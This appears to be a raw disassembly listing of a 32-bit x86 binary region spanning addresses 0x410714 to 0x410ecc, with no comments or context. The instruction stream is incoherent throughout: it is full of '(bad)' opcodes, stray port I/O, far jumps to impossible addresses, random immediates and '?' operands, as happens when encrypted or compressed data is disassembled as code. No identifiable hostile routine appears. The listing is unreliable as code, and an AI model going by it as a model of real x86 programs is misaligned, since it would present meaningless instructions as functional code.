  410714:	cmp    DWORD PTR [eax],ebp
  410716:	inc    eax
  410717:	jae    0x410726
  410719:	rcr    BYTE PTR [edx-0x2f],0x19
  41071d:	in     al,dx
  41071e:	ins    BYTE PTR es:[edi],dx
  41071f:	jno    0x4106f4
  410721:	loop   0x410783
  410723:	ss std 
  410725:	clc    
  410726:	xor    BYTE PTR [edi+0x462649d7],0xca
  41072d:	and    BYTE PTR [edx],al
  41072f:	push   ebp
  410730:	mov    eax,DWORD PTR [edi+0x15]
  410733:	and    dl,BYTE PTR [esi]
  410735:	int    0x3d
  410737:	lods   eax,DWORD PTR fs:[esi]
  410739:	push   0x6e867a57
  41073e:	aaa    
  41073f:	stc    
  410740:	xchg   DWORD PTR [esi-0x48],esi
  410743:	push   0x2bffcd8d
  410748:	shr    DWORD PTR [ebx],0x45
  41074b:	cld    
  41074c:	jmp    0x410c57
  410751:	retf   0xc0cd
  410754:	rcr    bl,1
  410756:	aad    0xda
  410758:	shl    DWORD PTR [ecx-0x4997228b],1
  41075e:	or     esi,DWORD PTR [esi+edx*8+0x78786498]
  410765:	push   0x7c
  410767:	js     0x4107e1
  410769:	cmp    edi,esp
  41076b:	push   ss
  41076c:	enter  0x5324,0x68
  410770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410771:	jne    0x410799
  410773:	xchg   sp,ax
  410775:	mov    edx,0xe90c58cd
  41077a:	ret    0x9aed
  41077d:	in     eax,dx
  41077e:	retf   
  41077f:	out    dx,al
  410780:	stc    
  410781:	push   edi
  410782:	push   edi
  410783:	xor    ebx,DWORD PTR [edi]
  410785:	or     eax,esi
  410787:	cmp    bl,cl
  410789:	inc    ebx
  41078a:	outs   dx,DWORD PTR ds:[esi]
  41078b:	imul   eax,DWORD PTR [edx+0x5af3e4b3],0x74081583
  410795:	inc    ebp
  410796:	mov    esi,0x21a0e41a
  41079b:	adc    edx,edx
  41079d:	idiv   DWORD PTR [ecx]
  41079f:	dec    edx
  4107a0:	and    DWORD PTR es:[esi-0x70],ebp
  4107a4:	mov    ebp,0x37b384f8
  4107a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107aa:	xchg   DWORD PTR [ebx+0x45],edi
  4107ad:	xchg   ecx,eax
  4107ae:	jno    0x41073e
  4107b0:	jb     0x410759
  4107b2:	mov    eax,0xee0b3532
  4107b7:	sbb    ah,BYTE PTR [esi-0x3e2f1b]
  4107bd:	in     al,0xf4
  4107bf:	lods   eax,DWORD PTR ds:[esi]
  4107c0:	sub    al,0x9c
  4107c2:	push   cs
  4107c3:	dec    eax
  4107c4:	mov    ebx,0x934ce4b5
  4107c9:	ds mov dh,0x52
  4107cc:	lods   al,BYTE PTR ds:[esi]
  4107cd:	fdiv   QWORD PTR [edx+esi*1-0x20]
  4107d1:	stos   BYTE PTR es:[edi],al
  4107d2:	mov    dh,dl
  4107d4:	sbb    BYTE PTR cs:[edi-0x39],al
  4107d8:	test   dh,dh
  4107da:	mov    bh,0x3a
  4107dc:	mov    edx,0x23b15666
  4107e1:	mov    ebp,0x8a9cfc89
  4107e6:	dec    ecx
  4107e7:	test   ebp,esp
  4107e9:	inc    edi
  4107ea:	sbb    ch,BYTE PTR [ebx-0x3a]
  4107ed:	or     dh,BYTE PTR fs:[ecx-0x49]
  4107f1:	jp     0x4107c9
  4107f3:	(bad)  
  4107f4:	lods   al,BYTE PTR ds:[esi]
  4107f5:	mov    esp,0xa2629d35
  4107fa:	mov    ds:0x428080e0,al
  4107ff:	sbb    al,0x35
  410801:	test   BYTE PTR [esi-0x6b],dl
  410804:	nop
  410805:	fwait
  410806:	loope  0x4107cf
  410808:	repnz mov ch,0xc1
  41080b:	and    edx,DWORD PTR [ecx-0x34088d6e]
  410811:	add    BYTE PTR [edi-0x4811c8a5],ch
  410817:	out    dx,eax
  410818:	xchg   ebx,eax
  410819:	mov    eax,ds:0x65e10d3a
  41081e:	xor    al,bl
  410820:	sub    al,0x1b
  410822:	dec    ecx
  410823:	add    ch,0x8a
  410826:	test   eax,0x174dd46c
  41082b:	scas   al,BYTE PTR es:[edi]
  41082c:	sti    
  41082d:	pop    ebp
  41082e:	pop    edi
  41082f:	mov    ebp,0xe7dc15f0
  410834:	mov    DWORD PTR [eax],ecx
  410836:	or     esi,esp
  410838:	dec    eax
  410839:	and    bl,BYTE PTR [esi+0x4f]
  41083c:	inc    DWORD PTR [edi-0x6e3b76cc]
  410842:	dec    ecx
  410843:	ja     0x4107c9
  410845:	cmp    al,0x2f
  410847:	out    dx,eax
  410848:	cmp    dl,bh
  41084a:	(bad)  
  41084b:	loope  0x410821
  41084d:	push   esi
  41084e:	repz push ds
  410850:	pusha  
  410851:	or     dh,dh
  410853:	mov    esp,0xb9ed0663
  410858:	pop    es
  410859:	adc    DWORD PTR [edx],0x39
  41085c:	fiadd  WORD PTR [ecx]
  41085e:	ror    BYTE PTR [eax+0x44],0x79
  410862:	sbb    ecx,DWORD PTR [ebp-0x47e2df2e]
  410868:	xor    DWORD PTR [ebx+eiz*4+0x30fd556f],0x5ddce1f8
  410873:	cwde   
  410874:	dec    edx
  410875:	xlat   BYTE PTR ds:[ebx]
  410876:	add    bl,BYTE PTR [edx]
  410878:	xor    eax,0x11beb15e
  41087d:	shl    BYTE PTR [ebx-0x44c3597b],cl
  410883:	cmp    DWORD PTR ds:0x7311c045,edx
  410889:	adc    edi,DWORD PTR [edx-0x46]
  41088c:	pop    ss
  41088d:	std    
  41088e:	std    
  41088f:	xchg   BYTE PTR [ebx+0x1312b46d],ah
  410895:	jb     0x410889
  410897:	or     DWORD PTR [esp+eax*4],esp
  41089a:	push   ss
  41089b:	and    eax,0xee1aa742
  4108a0:	cmp    esi,eax
  4108a2:	mov    BYTE PTR [edx+0x68],ch
  4108a5:	ins    DWORD PTR es:[edi],dx
  4108a6:	js     0x410913
  4108a8:	sub    DWORD PTR [esi+0x3c4ae992],esp
  4108ae:	inc    edi
  4108af:	adc    ch,bl
  4108b1:	rol    al,cl
  4108b3:	or     DWORD PTR [edi+edx*8+0x23],ebx
  4108b7:	(bad)  
  4108b8:	call   0x8fe87246
  4108bd:	pop    ds
  4108be:	hlt    
  4108bf:	push   ecx
  4108c0:	and    edi,DWORD PTR [ebp-0x5f2ca2c]
  4108c6:	sub    ah,cl
  4108c8:	push   ecx
  4108c9:	cmp    esi,DWORD PTR [edx-0x3a]
  4108cc:	mov    eax,ds:0x3c8998cb
  4108d1:	test   al,0xea
  4108d3:	mov    ebx,0x29da69d3
  4108d8:	inc    ebp
  4108d9:	and    bl,BYTE PTR [esi+0x7c]
  4108dc:	jge    0x410944
  4108de:	inc    eax
  4108df:	add    al,0x23
  4108e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108e2:	xchg   ecx,eax
  4108e3:	jnp    0x4108e1
  4108e5:	adc    cl,0x57
  4108e8:	test   BYTE PTR [edx],ch
  4108ea:	aaa    
  4108eb:	jo     0x41092c
  4108ed:	imul   edx,DWORD PTR [ecx],0x17569cdf
  4108f3:	jmp    0x410881
  4108f5:	imul   ebp,DWORD PTR [eax-0x70221e1],0xffffffc5
  4108fc:	shr    esi,cl
  4108fe:	and    dh,al
  410900:	xor    eax,0x95c964cd
  410905:	sub    BYTE PTR [edi],al
  410907:	lock out 0x6d,al
  41090a:	sbb    ch,dl
  41090c:	cmc    
  41090d:	inc    esi
  41090e:	or     ch,dh
  410910:	pop    edi
  410911:	push   cs
  410912:	sahf   
  410913:	mov    esp,0x5ea5b9a4
  410918:	xchg   esp,eax
  410919:	cmp    eax,0x2381b05b
  41091e:	jle    0x410925
  410920:	jae    0x4108dd
  410922:	int    0x60
  410924:	test   al,0x96
  410926:	test   al,0xb1
  410928:	pop    edx
  410929:	retf   0x7615
  41092c:	outs   dx,BYTE PTR ds:[esi]
  41092d:	inc    ecx
  41092e:	jmp    0x1ee58312
  410933:	ins    BYTE PTR es:[edi],dx
  410934:	push   edi
  410935:	fisub  DWORD PTR [ecx-0x439ec9fa]
  41093b:	jg     0x4108d6
  41093d:	dec    eax
  41093e:	int3   
  41093f:	add    al,0x6b
  410941:	not    BYTE PTR [eax+ebp*8]
  410944:	outs   dx,DWORD PTR ds:[esi]
  410945:	retf   0x63f0
  410948:	mov    esp,0x371b7109
  41094d:	in     al,0xc3
  41094f:	pop    edi
  410950:	and    ah,BYTE PTR [eax]
  410952:	imul   edi
  410954:	scas   eax,DWORD PTR es:[edi]
  410955:	jb     0x410906
  410957:	out    0xc0,al
  410959:	dec    edi
  41095a:	pop    esp
  41095b:	not    dl
  41095d:	into   
  41095e:	mov    ch,0x84
  410960:	push   gs
  410962:	mov    dh,0x46
  410964:	xor    ebp,ecx
  410966:	fsub   DWORD PTR [eax]
  410968:	push   ss
  410969:	cli    
  41096a:	mov    edi,0x57c85d89
  41096f:	mov    eax,0xc9d4820d
  410974:	inc    ebx
  410975:	dec    esi
  410976:	lds    esp,FWORD PTR [eax]
  410978:	xor    esp,ebp
  41097a:	int3   
  41097b:	and    DWORD PTR [eax+eax*2+0x75a1b69b],0xffffffc9
  410983:	pusha  
  410984:	ficomp DWORD PTR [esi-0x5c240e5a]
  41098a:	lods   eax,DWORD PTR ds:[esi]
  41098b:	jbe    0x410935
  41098d:	xor    BYTE PTR [edi+ebp*8-0x65fd1c0],dl
  410994:	push   cs
  410995:	pop    ds
  410996:	dec    esp
  410997:	mov    ds:0x4ec34334,al
  41099c:	pop    edi
  41099d:	fwait
  41099e:	in     eax,0x40
  4109a0:	dec    ecx
  4109a1:	lea    edi,[esi+esi*2-0x4a72847b]
  4109a8:	push   ebp
  4109a9:	push   es
  4109aa:	and    ebp,edx
  4109ac:	and    BYTE PTR [edi+ecx*8-0x3f984af7],dl
  4109b3:	js     0x4109da
  4109b5:	push   ebx
  4109b6:	lds    ecx,FWORD PTR fs:[eax-0x4d4776a0]
  4109bd:	push   esi
  4109be:	push   ebx
  4109bf:	cli    
  4109c0:	in     eax,dx
  4109c1:	out    0xbb,eax
  4109c3:	sbb    DWORD PTR [ecx-0x6f],esi
  4109c6:	leave  
  4109c7:	fs out dx,al
  4109c9:	fist   WORD PTR [esi]
  4109cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109cc:	xor    eax,0xfbdf822
  4109d1:	psubsw mm4,QWORD PTR [edi]
  4109d4:	jne    0x4109bb
  4109d6:	(bad)  
  4109d7:	pop    edx
  4109d8:	lods   al,BYTE PTR ds:[esi]
  4109d9:	(bad)  
  4109da:	daa    
  4109db:	out    dx,eax
  4109dc:	pop    esi
  4109dd:	mov    esi,fs
  4109df:	cmp    al,0x3b
  4109e1:	out    dx,al
  4109e2:	nop
  4109e3:	nop
  4109e4:	stc    
  4109e5:	mov    cl,0x3
  4109e7:	fldcw  WORD PTR ss:[ebx]
  4109ea:	sbb    dl,BYTE PTR [ecx+0x13]
  4109ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109ee:	xchg   BYTE PTR [edx+0x5a],bh
  4109f1:	pop    esp
  4109f2:	and    al,0x3e
  4109f4:	push   ebx
  4109f5:	fcom   DWORD PTR [ebx+0x2492824]
  4109fb:	mov    ds,WORD PTR [esi]
  4109fd:	clc    
  4109fe:	js     0x410a76
  410a00:	imul   esp,DWORD PTR [edi],0x2d028372
  410a06:	mov    ?,WORD PTR [eax]
  410a08:	out    dx,eax
  410a09:	lds    ebx,FWORD PTR [ebx+edi*2+0x74]
  410a0d:	mov    esp,0xdfb36fd8
  410a12:	fdiv   QWORD PTR ds:0x5db55e2b
  410a18:	mov    WORD PTR [edx-0x4b],gs
  410a1b:	inc    edx
  410a1c:	scas   eax,DWORD PTR es:[edi]
  410a1d:	rcr    DWORD PTR [esi+ebx*1],0xcb
  410a21:	jbe    0x410a6c
  410a23:	push   ss
  410a24:	or     eax,0x25237935
  410a29:	add    bh,BYTE PTR [ebx]
  410a2b:	hlt    
  410a2c:	and    al,0x61
  410a2e:	popa   
  410a2f:	jmp    0x6ede:0x8d42e284
  410a36:	inc    esi
  410a37:	xchg   esp,eax
  410a38:	mov    dh,0x59
  410a3a:	jge    0x410a53
  410a3c:	jmp    0x2823e2ca
  410a41:	sti    
  410a42:	or     al,0x47
  410a44:	(bad)  
  410a45:	div    BYTE PTR [edx]
  410a47:	xabort 0xf9
  410a4a:	push   es
  410a4b:	jp     0x4109fd
  410a4d:	push   ebp
  410a4e:	aas    
  410a4f:	imul   edx,DWORD PTR [edi-0x32b4995e],0xffffffc5
  410a56:	fisub  DWORD PTR ds:0x4dd93bee
  410a5c:	cdq    
  410a5d:	xchg   ebp,eax
  410a5e:	or     al,0xd2
  410a60:	loop   0x410a97
  410a62:	jmp    0x83aff662
  410a67:	add    DWORD PTR [esi-0x20ee934c],ebp
  410a6d:	lock jne 0x410a44
  410a70:	push   ss
  410a71:	cld    
  410a72:	push   0x41
  410a74:	shl    DWORD PTR [esp+ecx*2],cl
  410a77:	(bad)  
  410a78:	push   ebx
  410a79:	cdq    
  410a7a:	cmp    ch,BYTE PTR [ecx+0x3]
  410a7d:	imul   ebp,edx,0x7e
  410a80:	daa    
  410a81:	add    cl,BYTE PTR [edx]
  410a83:	cmc    
  410a84:	loop   0x410a3c
  410a86:	pop    edx
  410a87:	xor    BYTE PTR [edi-0x58],cl
  410a8a:	pusha  
  410a8b:	(bad)  
  410a8c:	push   ds
  410a8d:	mov    esi,0x1d133e2c
  410a92:	cmp    DWORD PTR [esi+0x3343e23b],ebx
  410a98:	test   eax,0xe3e58edd
  410a9d:	jmp    0xff3c:0xfa834bcb
  410aa4:	inc    ebp
  410aa5:	adc    BYTE PTR [esi],bl
  410aa7:	adc    edi,0x9a370dc5
  410aad:	and    DWORD PTR [ecx+edi*1-0x5d],edi
  410ab1:	cmp    edi,DWORD PTR ds:0xd7ba3ce0
  410ab7:	or     ebx,DWORD PTR [ebx+0x16]
  410aba:	inc    edi
  410abb:	xor    BYTE PTR [eax],0xbe
  410abe:	mov    ecx,0x65531cd0
  410ac3:	popa   
  410ac4:	lahf   
  410ac5:	add    DWORD PTR [eax+0x4b5601a1],0xc7f6bf55
  410acf:	jae    0x410a5a
  410ad1:	adc    BYTE PTR [edx-0x53],bh
  410ad4:	movd   mm3,DWORD PTR [ebp-0x550f783e]
  410adb:	fimul  WORD PTR [ecx+0x7c98b83]
  410ae1:	ret    
  410ae2:	ret    0x62a1
  410ae5:	jae    0x410b5f
  410ae7:	stos   BYTE PTR es:[edi],al
  410ae8:	sbb    bh,cl
  410aea:	sbb    BYTE PTR [esi-0x7612d459],dh
  410af0:	or     ch,dh
  410af2:	fneni(8087 only) 
  410af4:	ins    BYTE PTR es:[edi],dx
  410af5:	push   esi
  410af6:	mov    edi,0xc4509b54
  410afb:	dec    eax
  410afc:	mov    cl,0xc5
  410afe:	add    DWORD PTR [esi-0x26157308],esi
  410b04:	adc    ebp,ebx
  410b06:	dec    esi
  410b07:	shr    BYTE PTR [ebp+0x77c9e1f1],cl
  410b0d:	cdq    
  410b0e:	inc    ecx
  410b0f:	xchg   ecx,eax
  410b10:	pusha  
  410b11:	or     eax,0x67bfff2a
  410b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b17:	mov    ds:0x209a36f7,al
  410b1c:	cmp    BYTE PTR [ecx],cl
  410b1e:	dec    esp
  410b1f:	dec    ecx
  410b20:	dec    edx
  410b21:	cld    
  410b22:	mov    ebx,0x20f56ca9
  410b27:	or     BYTE PTR [ebp+0x105bede2],dh
  410b2d:	gs ins BYTE PTR es:[edi],dx
  410b2f:	call   0xd5fc:0xad7f9614
  410b36:	test   al,0x50
  410b38:	mov    al,0x94
  410b3a:	add    cl,0xa9
  410b3d:	outs   dx,BYTE PTR ds:[esi]
  410b3e:	mov    ah,0x6
  410b40:	or     DWORD PTR [edx+0x42864e7e],ebp
  410b46:	addr16 iret 
  410b48:	aad    0xbb
  410b4a:	retf   0xfc3
  410b4d:	push   es
  410b4e:	sub    ecx,ebp
  410b50:	jp     0x410ade
  410b52:	xor    al,0x3d
  410b54:	ins    BYTE PTR es:[edi],dx
  410b55:	and    ah,ch
  410b57:	sbb    al,0x6d
  410b59:	popf   
  410b5a:	push   ss
  410b5b:	js     0x410b7f
  410b5d:	and    eax,0xf6bf605a
  410b62:	std    
  410b63:	push   ds
  410b64:	pop    ebx
  410b65:	push   0xc072c92c
  410b6a:	inc    ecx
  410b6b:	sub    dl,al
  410b6d:	pop    eax
  410b6e:	dec    esi
  410b6f:	xchg   ebx,eax
  410b70:	lds    edi,FWORD PTR [edi]
  410b72:	cmp    dl,BYTE PTR [ecx+0x7ddbea26]
  410b78:	fs mov ch,0x25
  410b7b:	popf   
  410b7c:	retf   0x10f9
  410b7f:	jle    0x410b1c
  410b81:	push   ss
  410b82:	in     al,dx
  410b83:	xchg   ebp,eax
  410b84:	ret    0xb653
  410b87:	jle    0x410bc3
  410b89:	cs aam 0x35
  410b8c:	cld    
  410b8d:	js     0x410b45
  410b8f:	shl    BYTE PTR [eax+0xab4889f],0xcb
  410b96:	mov    ecx,0x316fa77c
  410b9b:	or     eax,0x3493247
  410ba0:	(bad)  
  410ba2:	sbb    al,BYTE PTR [esi+0x65]
  410ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ba6:	ins    BYTE PTR es:[edi],dx
  410ba7:	pop    ss
  410ba8:	sahf   
  410ba9:	mov    edx,0x2e95382a
  410bae:	leave  
  410baf:	mov    edx,0x355722db
  410bb4:	xchg   ecx,eax
  410bb5:	inc    ebx
  410bb6:	hlt    
  410bb7:	push   edi
  410bb8:	jl     0x410c39
  410bba:	aas    
  410bbb:	outs   dx,BYTE PTR ds:[esi]
  410bbc:	int3   
  410bbd:	aaa    
  410bbe:	xlat   BYTE PTR ds:[ebx]
  410bbf:	cwde   
  410bc0:	pop    esp
  410bc1:	scas   al,BYTE PTR es:[edi]
  410bc2:	daa    
  410bc3:	mov    ecx,ds
  410bc5:	sub    eax,0xb8655f85
  410bca:	cwde   
  410bcb:	cld    
  410bcc:	shl    DWORD PTR [esi+ecx*8-0x4a],0x7d
  410bd1:	aam    0x9d
  410bd3:	jne    0x410b80
  410bd5:	sub    eax,0x68465182
  410bda:	pop    esi
  410bdb:	xor    BYTE PTR [edi],dl
  410bdd:	mov    dl,0x91
  410bdf:	daa    
  410be0:	and    BYTE PTR [edi+edx*8+0x8],bh
  410be4:	sub    eax,0x776d017d
  410be9:	int    0x7d
  410beb:	dec    esi
  410bec:	fild   QWORD PTR [ebp-0x5a]
  410bef:	pop    ds
  410bf0:	aad    0xe0
  410bf2:	out    0x82,al
  410bf4:	jne    0x410b9e
  410bf6:	push   0xffffffbf
  410bf8:	loopne 0x410c01
  410bfa:	rol    eax,0xc1
  410bfd:	dec    ebp
  410bfe:	mov    eax,0xbc9212e7
  410c03:	and    esi,0xb547129f
  410c09:	mov    ds:0xa8338310,eax
  410c0e:	jge    0x410bdc
  410c10:	fidivr WORD PTR [ecx+ebp*2-0x21]
  410c14:	(bad)  
  410c15:	addr16 (bad) 
  410c17:	pop    eax
  410c18:	sub    cl,BYTE PTR [eax+0x13]
  410c1b:	daa    
  410c1c:	clc    
  410c1d:	stc    
  410c1e:	std    
  410c1f:	dec    ebx
  410c20:	pop    ebp
  410c21:	push   ebx
  410c22:	adc    ah,BYTE PTR [edx+0x391fc789]
  410c28:	ret    
  410c29:	add    DWORD PTR [esi+ebp*2],esi
  410c2c:	inc    edx
  410c2d:	mov    al,0xe1
  410c2f:	xchg   BYTE PTR [eax+0x775a0748],dh
  410c35:	(bad)  [ecx-0x44]
  410c38:	add    cl,BYTE PTR [ebp+0x7474705f]
  410c3e:	cdq    
  410c3f:	push   0x7159404a
  410c44:	call   0x2035699b
  410c49:	sub    DWORD PTR [ecx-0x611131a8],esi
  410c4f:	out    0x14,eax
  410c51:	xchg   DWORD PTR [eax+eiz*4-0x4],edx
  410c55:	inc    esi
  410c56:	mov    ebx,0x3b84d8b
  410c5b:	enter  0x458b,0xfc
  410c5f:	mov    DWORD PTR [eax+0x1],ecx
  410c62:	mov    al,BYTE PTR [ebp-0x11]
  410c65:	jmp    0x411170
  410c6a:	rol    dl,0x3f
  410c6d:	ds leave 
  410c6f:	rol    ebp,0xca
  410c72:	stos   DWORD PTR es:[edi],eax
  410c73:	test   BYTE PTR [eax],cl
  410c75:	leave  
  410c76:	push   0xffffffc1
  410c78:	jecxz  0x410c0d
  410c7a:	mov    ch,BYTE PTR [edi+0x78]
  410c7d:	js     0x410ce9
  410c7f:	jl     0x410cf9
  410c81:	js     0x410ce9
  410c83:	sbb    BYTE PTR [ebp+0x1e6caec4],ch
  410c89:	jle    0x410c9e
  410c8b:	mov    al,0xfe
  410c8d:	(bad)  
  410c8e:	out    0x69,eax
  410c90:	popa   
  410c91:	pusha  
  410c92:	fcmovnu st,st(2)
  410c94:	mov    ecx,0xf48ca5a7
  410c99:	inc    esi
  410c9a:	ins    DWORD PTR es:[edi],dx
  410c9b:	(bad)  
  410c9c:	std    
  410c9d:	mov    eax,ds:0xa92934a5
  410ca2:	cmp    dh,bl
  410ca4:	cmp    al,0x30
  410ca6:	and    al,0xb8
  410ca8:	call   FWORD PTR [edx]
  410caa:	jp     0x410c42
  410cac:	jb     0x410c83
  410cae:	ret    
  410caf:	add    eax,0x34ba5f4b
  410cb4:	adc    BYTE PTR [eax-0x62],dh
  410cb7:	sbb    al,0xa
  410cb9:	arpl   cx,bx
  410cbb:	lods   al,BYTE PTR ds:[esi]
  410cbc:	lds    esi,FWORD PTR [ebx]
  410cbe:	mov    bl,0xd7
  410cc0:	in     al,dx
  410cc1:	or     eax,DWORD PTR [eax+edx*8-0x2f]
  410cc5:	xchg   BYTE PTR [eax+ecx*1+0x63d6fb0d],dl
  410ccc:	ret    0x5335
  410ccf:	xor    eax,0xf0f15125
  410cd4:	sub    DWORD PTR [edi],edx
  410cd6:	ds ins DWORD PTR es:[edi],dx
  410cd8:	and    eax,0x43f040c1
  410cdd:	je     0x410d0d
  410cdf:	and    DWORD PTR [ecx],esi
  410ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ce2:	mov    ds:0xcad68464,al
  410ce7:	into   
  410ce8:	fist   WORD PTR [edx]
  410cea:	and    BYTE PTR [esi+0x69d58bb7],ah
  410cf0:	retf   0xb5cc
  410cf3:	sbb    al,BYTE PTR [ecx]
  410cf5:	popf   
  410cf6:	mov    ebx,0x3c30d7b5
  410cfb:	rol    BYTE PTR [ecx],cl
  410cfd:	dec    esp
  410cfe:	pop    edx
  410cff:	and    DWORD PTR [edi+edi*1-0x60],edx
  410d03:	sbb    dh,al
  410d05:	push   ebx
  410d06:	sub    ebx,DWORD PTR [esi+0x1c29ffa2]
  410d0c:	call   0x9a3c:0x60f1f18
  410d13:	inc    esp
  410d14:	jg     0x410d89
  410d16:	xor    al,0xe9
  410d18:	ins    DWORD PTR es:[edi],dx
  410d19:	mov    WORD PTR [ebp+0x5b614255],?
  410d1f:	jecxz  0x410d2f
  410d21:	and    DWORD PTR [edi+0x1f],esi
  410d24:	scas   al,BYTE PTR es:[edi]
  410d25:	inc    ebx
  410d26:	in     eax,dx
  410d27:	sti    
  410d28:	dec    ecx
  410d29:	mov    al,0x6b
  410d2b:	(bad)  
  410d2c:	int    0x7f
  410d2e:	aas    
  410d2f:	mov    ebx,0xb60e321d
  410d34:	and    esi,DWORD PTR [bx+si+0x5109]
  410d39:	lods   eax,DWORD PTR ds:[esi]
  410d3a:	mov    DWORD PTR [ebx],eax
  410d3c:	mov    edx,0xb61df720
  410d41:	jmp    0x3a23872d
  410d46:	js     0x410cd8
  410d48:	ss retf 0xaf8
  410d4c:	ins    BYTE PTR es:[edi],dx
  410d4d:	es iret 
  410d4f:	xor    BYTE PTR [ecx],dh
  410d51:	test   DWORD PTR [esi-0x23],esi
  410d54:	mov    ds:0x5dc6660e,eax
  410d59:	push   esi
  410d5a:	loop   0x410dd2
  410d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d5d:	test   DWORD PTR [eax+0x7d],ebp
  410d60:	jmp    0xa209:0x835905f4
  410d67:	mov    esi,DWORD PTR [esi+0x60]
  410d6a:	retf   
  410d6b:	loop   0x410d42
  410d6d:	push   es
  410d6e:	cmp    esp,ebp
  410d70:	jge    0x410dbd
  410d72:	(bad)  
  410d73:	fmul   QWORD PTR [ebp+0xcdbfaf7]
  410d79:	and    eax,0x49911a9f
  410d7e:	pop    ebx
  410d7f:	push   0xffffff8c
  410d81:	push   edx
  410d82:	icebp  
  410d83:	ja     0x410d26
  410d85:	xchg   ebp,eax
  410d86:	inc    esi
  410d87:	sub    bl,BYTE PTR ds:0x37ce10d8
  410d8d:	les    ebx,FWORD PTR [ecx-0x12b1a0d6]
  410d93:	and    eax,0x602b2577
  410d98:	aas    
  410d99:	sbb    esp,edi
  410d9b:	sbb    ah,BYTE PTR [edx+0x2b]
  410d9e:	es iret 
  410da0:	ss push edx
  410da2:	mov    ds:0x9f972198,eax
  410da7:	sub    al,0xf4
  410da9:	int3   
  410daa:	outs   dx,DWORD PTR ds:[esi]
  410dab:	pop    es
  410dac:	std    
  410dad:	mov    edi,0x5debe64e
  410db2:	pop    es
  410db3:	push   edx
  410db4:	sar    BYTE PTR [esi],1
  410db6:	pop    edi
  410db7:	shl    DWORD PTR [edx-0x18d31835],1
  410dbd:	stos   DWORD PTR es:[edi],eax
  410dbe:	aam    0xaf
  410dc0:	pop    es
  410dc1:	repz inc esi
  410dc3:	mov    ebp,0x551288dc
  410dc8:	ficomp WORD PTR [eax+ecx*4]
  410dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dcc:	fidiv  DWORD PTR [edx]
  410dce:	ds nop
  410dd0:	jae    0x410e0a
  410dd2:	mov    ah,0x48
  410dd4:	xchg   edi,eax
  410dd5:	clc    
  410dd6:	push   ds
  410dd7:	sub    eax,0x63338f11
  410ddc:	fdivp  st(4),st
  410dde:	popf   
  410ddf:	sti    
  410de0:	inc    esi
  410de1:	xlat   BYTE PTR ds:[ebx]
  410de2:	sub    al,0x65
  410de5:	jle    0x410e33
  410de7:	and    al,BYTE PTR [edi+0x604d643f]
  410ded:	js     0x410da9
  410def:	jp     0x410e27
  410df1:	pop    eax
  410df2:	jp     0x410e6f
  410df4:	imul   ebx,DWORD PTR [edi+0x24],0xcaa44fbe
  410dfb:	xchg   BYTE PTR [esi],dl
  410dfd:	mov    al,ss:0xed0f3792
  410e03:	mov    dl,BYTE PTR [eax]
  410e05:	dec    esp
  410e06:	aas    
  410e07:	xchg   ebp,eax
  410e08:	out    0x1d,al
  410e0a:	or     esp,esi
  410e0c:	pop    edx
  410e0d:	retf   
  410e0e:	inc    esp
  410e0f:	and    eax,0x7a4f68d4
  410e14:	xchg   esi,eax
  410e15:	jmp    0x1813:0x8abe8d70
  410e1c:	ds dec ebp
  410e1e:	test   DWORD PTR [eax-0x7c183bd5],0x181ca6b7
  410e28:	pop    ebx
  410e29:	adc    BYTE PTR [edx+esi*4+0x31],0x1d
  410e2e:	popf   
  410e2f:	mov    ch,0x6d
  410e31:	xor    DWORD PTR [esi],edx
  410e33:	clc    
  410e34:	cwde   
  410e35:	push   cs
  410e36:	test   eax,0x36aef4d7
  410e3b:	fidiv  WORD PTR [ecx-0x647726f7]
  410e41:	int    0x17
  410e43:	cmc    
  410e44:	sub    DWORD PTR [ebx],ebp
  410e46:	or     al,0x6b
  410e48:	neg    edi
  410e4a:	jg     0x410dee
  410e4c:	inc    edx
  410e4d:	and    bh,BYTE PTR [eax+0x7b]
  410e50:	daa    
  410e51:	inc    ebx
  410e52:	aaa    
  410e53:	jnp    0x410ecd
  410e55:	stos   BYTE PTR es:[edi],al
  410e56:	inc    edi
  410e57:	dec    eax
  410e58:	fistp  DWORD PTR [ebp-0x5]
  410e5b:	pop    ss
  410e5c:	popf   
  410e5d:	sbb    al,0x60
  410e5f:	add    BYTE PTR [eax-0x490daa4c],0x3
  410e66:	hlt    
  410e67:	lea    ebp,[esi+0x60]
  410e6a:	inc    ebp
  410e6b:	push   esp
  410e6c:	inc    ecx
  410e6d:	xchg   ebx,eax
  410e6e:	sub    DWORD PTR [edi+0x450fd83c],ecx
  410e74:	addr16 pop edx
  410e76:	sbb    BYTE PTR [ebp+0x6a],bl
  410e79:	stos   DWORD PTR es:[edi],eax
  410e7a:	mov    ds:0x208e48c9,eax
  410e7f:	shr    DWORD PTR ds:[ecx-0x10],cl
  410e83:	adc    eax,0xe381e0ad
  410e88:	pop    ecx
  410e89:	int    0xe8
  410e8b:	jmp    0x410e9f
  410e8d:	scas   eax,DWORD PTR es:[edi]
  410e8e:	inc    edx
  410e8f:	fiadd  DWORD PTR [esi+0x534b9319]
  410e95:	mov    ch,ah
  410e97:	adc    DWORD PTR [edx+0x7c],0x1d
  410e9b:	xchg   ecx,eax
  410e9c:	and    al,0xa2
  410e9e:	push   ds
  410e9f:	xor    al,BYTE PTR [ecx-0x6d]
  410ea2:	in     al,0xd0
  410ea4:	cmp    BYTE PTR ds:[ebp+eiz*1+0x5f6dbb5a],bl
  410eac:	jmp    0x3b2e698
  410eb1:	cli    
  410eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eb3:	fdiv   QWORD PTR ds:0x40d8c61d
  410eb9:	xlat   BYTE PTR ds:[ebx]
  410eba:	xchg   edi,ebx
  410ebc:	fisttp DWORD PTR [edi+0x20]
  410ebf:	and    eax,0x8b8456ec
  410ec4:	jge    0x410ecc
  410ec6:	and    al,al
  410ec8:	mov    ebp,esi
  410eca:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410ecc:	ja     0x410ece
